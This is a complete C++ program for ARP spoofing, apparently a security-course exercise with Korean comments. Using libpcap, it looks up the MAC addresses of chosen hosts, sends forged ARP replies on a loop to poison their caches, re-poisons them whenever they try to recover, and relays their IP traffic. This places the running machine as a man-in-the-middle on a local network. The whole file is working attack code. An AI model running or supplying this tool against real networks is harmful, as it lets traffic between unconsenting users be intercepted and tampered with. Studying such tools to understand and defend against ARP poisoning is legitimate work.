#include <cstdio>
#include <pcap.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <map>
#include <list>
#include <thread>
#include "libnet.h"
#include "ethhdr.h"
#include "arphdr.h"
#define REQUEST 1
#define REPLY 2
#define MACSIZE 6
#pragma pack(push, 1)
struct ip_hdr final {      //ip 헤더 구조체
   uint8_t    version_ihl;
   uint8_t    type_of_service;
   uint16_t    total_length;
   uint16_t    packet_id;
   uint16_t    fragment_offset;
   uint8_t    time_to_live;
   uint8_t    next_proto_id;
   uint16_t    hdr_checksum;
   Ip          src_addr;
   Ip          dst_addr;
   uint16_t total_length_() { return ntohs(total_length); }
   Ip src_addr_()    { return ntohl(src_addr); }
   Ip dst_addr_()    { return ntohl(dst_addr); }
};
struct EthIpPacket final {   //ip 패킷 구조체
   EthHdr eth_;
   ip_hdr ip_;
};
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
struct Flow final {
   Mac senderMac;
   Ip senderIp;
   Mac targetMac;
   Ip targetIp;
};
#pragma pack(pop)
std::map<Ip, Mac> arpTable;
std::list<Flow> flowList;
EthArpPacket packet;
bool thread = true;
// 사용법
void usage() {
   printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
   printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}
// 내 IP얻기
Ip getMyIp(char* dev) {
   uint32_t myIp;
   struct ifreq ifr;
   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if(sockfd < 0) {
      printf("socket error\n");
      exit(1);
   }
   strcpy(ifr.ifr_name, dev);
   if(ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
      printf("ioctl error\n");
      exit(1);
   }
   memcpy(&myIp, ifr.ifr_hwaddr.sa_data + 2, sizeof(myIp));
   close(sockfd);
   return Ip(ntohl(myIp));
}
// 내 MAC얻기
Mac getMyMac(char* dev) {
   uint8_t myMac[MACSIZE];
   struct ifreq ifr;
   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if(sockfd < 0) {
      printf("socket error\n");
      exit(1);
   }
   strcpy(ifr.ifr_name, dev);
   if(ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
      printf("ioctl error\n");
      exit(1);
   }
   memcpy(myMac, ifr.ifr_hwaddr.sa_data, sizeof(myMac));
   close(sockfd);
   return Mac(myMac);
}
// ARP packet 보내기
void sendPacket(pcap_t* handle, int op, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip) {
   if(op==REQUEST) packet.arp_.op_ = htons(ArpHdr::Request);
   else if(op==REPLY) packet.arp_.op_ = htons(ArpHdr::Reply);
   else printf("op error");
   packet.eth_.dmac_ = Mac(eth_dmac);
   packet.eth_.smac_ = Mac(eth_smac);
   packet.eth_.type_ = htons(EthHdr::Arp);
   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   packet.arp_.smac_ = Mac(arp_smac);
   packet.arp_.sip_ = htonl(Ip(arp_sip));
   packet.arp_.tmac_ = Mac(arp_tmac);
   packet.arp_.tip_ = htonl(Ip(arp_tip));
   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
   if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   return;
}
// IP로 MAC 얻어내기
Mac getYourMac(pcap_t* handle, Ip myIp, Mac myMac, Ip getIp) {
   Mac broadcast = Mac::broadcastMac();
   Mac unknown = Mac::nullMac();
   Mac yourMac;
   sendPacket(handle,REQUEST,myMac,broadcast,myMac,myIp,unknown,getIp);
   while (true) {
      struct pcap_pkthdr* header;
      const u_char* packet;
      int res = pcap_next_ex(handle, &header, &packet);
      if (res == 0) continue;
      if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
         printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
         break;
      }
      EthArpPacket reply;
      memcpy(&reply, packet, sizeof(EthArpPacket));
      if((reply.eth_.type() == EthHdr::Arp) && (reply.arp_.sip() == getIp)) {
         yourMac = reply.eth_.smac();
         break;
      }
   }
   return yourMac;
}
// ARP SPOOFING
void infect(pcap_t* handle, Mac myMac, Mac senderMac, Ip senderIp, Ip targetIp){
   printf("ARP Spoofing start\n");
   sendPacket(handle,REPLY,myMac,senderMac,myMac,targetIp,senderMac,senderIp);
}
// ARP RECOVER 되면 ARPSPOOFING
void reInfect(pcap_t* handle, const u_char* packet, Mac myMac,  Mac senderMac, Ip senderIp, Ip targetIp) {
   EthArpPacket request;
   memcpy(&request, packet, sizeof(EthArpPacket));
   if((request.eth_.type() == EthHdr::Arp && request.arp_.op() == ArpHdr::Request) && (request.arp_.smac() == senderMac && request.arp_.tip() == targetIp) || (request.eth_.smac() == senderMac && request.eth_.dmac_.isBroadcast())) {
          printf("reinfect start\n");
          infect(handle, myMac, senderMac, senderIp, targetIp);
   }
}
// RELAY IP PACKET
void relay(pcap_t* handle, const u_char* packet, Mac myMac, Ip myIp, Mac targetMac, Ip targetIp) {
   EthIpPacket relay;
   memcpy(&relay, packet, sizeof(EthIpPacket));
   if ((relay.eth_.type() == EthHdr::Ip4) && (relay.ip_.dst_addr_() != myIp) && (!relay.eth_.dmac_.isBroadcast())) {
      int packetSize = relay.ip_.total_length_() + sizeof(EthHdr);
      u_char* tempPacket = (u_char*)malloc(sizeof(u_char) * packetSize);
      relay.eth_.smac_ = myMac;
      relay.eth_.dmac_ = targetMac;
      memcpy(tempPacket, packet, packetSize);
      memcpy(tempPacket, &relay, sizeof(EthIpPacket));
      int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(tempPacket), packetSize);
      if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
      free(tempPacket);
   }
}
// ARP SPOOFING THREAD
void infectThread(pcap_t* handle, Mac myMac) {
   while(thread) {
      for(auto iter : flowList){
         infect(handle,myMac,iter.senderMac,iter.senderIp,iter.targetIp);
         sleep(1);
      }
   sleep(10);
   }
}
// RELAY IP PACKET THREAD
void relayThread(pcap_t* handle, Mac myMac, Ip myIp) {
   while(thread) {
      struct pcap_pkthdr* header;
      const u_char* relayPacket;
      int res = pcap_next_ex(handle, &header, &relayPacket);
      if (res == 0) continue;
      if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
         printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
         break;
      }
      for(auto iter : flowList){
         relay(handle, relayPacket, myMac, myIp, iter.targetMac, iter.targetIp);
         reInfect(handle, relayPacket, myMac, iter.senderMac, iter.senderIp, iter.targetIp);
      }
   }
}
// SIGNAL
void signalHandler (int sig) {
        printf("Thread 종료\n");
    thread = false;
        sleep(1);
        return;
}

int main(int argc, char* argv[]) {
   if ((argc < 4) || (argc%2) != 0) {
      usage();
      return -1;
   }
   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }
   Ip myIp = getMyIp(dev);
   printf("MY IP address: %s\n",std::string(myIp).data());
   Mac myMac = getMyMac(dev);
   printf("MY MAC address: %s\n",std::string(myMac).data());

   for(int i=1; i<(argc/2); i++) {
      Flow flow;
      Ip senderIp = Ip(argv[2*i]);
      flow.senderIp = senderIp;
      Ip targetIp = Ip(argv[2*i+1]);
      flow.targetIp = targetIp;
      if(arpTable.find(senderIp) == arpTable.end())
      arpTable[senderIp] = getYourMac(handle,myIp,myMac,senderIp);
      flow.senderMac = arpTable[senderIp];
      if(arpTable.find(targetIp) == arpTable.end())
      arpTable[targetIp] = getYourMac(handle,myIp,myMac,targetIp);
      flow.targetMac = arpTable[targetIp];
      flowList.push_back(flow);
      printf("Flow make\n");
   }
   std::thread t1(infectThread,handle,myMac);
   std::thread t2(relayThread,handle,myMac,myIp);
   signal(SIGINT, signalHandler);
   t1.join();
   t2.join();
   pcap_close(handle);
}
